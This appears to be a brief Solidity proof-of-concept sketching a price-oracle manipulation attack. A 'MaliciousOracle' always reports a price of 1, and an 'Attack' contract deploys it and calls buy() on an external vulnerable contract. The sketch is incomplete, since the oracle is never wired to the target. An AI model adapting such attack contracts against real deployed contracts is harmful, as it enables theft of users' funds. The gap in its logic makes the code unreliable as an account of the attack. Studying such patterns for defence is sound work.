// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MaliciousOracle {
    function getPrice() external view returns (uint256) {
        return 1; // Return an extremely low price
    }
}

contract Attack {
    VulnerableContract public vulnerableContract;
    MaliciousOracle public maliciousOracle;

    constructor(address vulnerableContractAddress) {
        vulnerableContract = VulnerableContract(vulnerableContractAddress);
        maliciousOracle = new MaliciousOracle();
    }

    function performAttack() public payable {
        vulnerableContract.buy{value: msg.value}();
    }
}
